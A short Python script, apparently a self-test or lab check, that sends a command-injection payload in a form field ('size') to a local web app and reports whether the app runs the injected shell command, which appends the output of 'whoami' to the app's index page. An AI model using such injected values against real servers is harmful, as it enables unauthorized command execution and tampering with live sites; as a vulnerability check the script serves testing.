import requests


def main(url):
    req = requests.post(url, data={'size' : "150;echo `whoami` >> app/index.html;"})
    result = bool(req.text.find("root") > 0)
    if result :
        msg = "The app is vulnerable"
    else :
        msg = "You are in good hands"
    return (result, msg)

if __name__ == '__main__':
	url = "http://localhost:5000/home"
	res = main(url)
	print(res)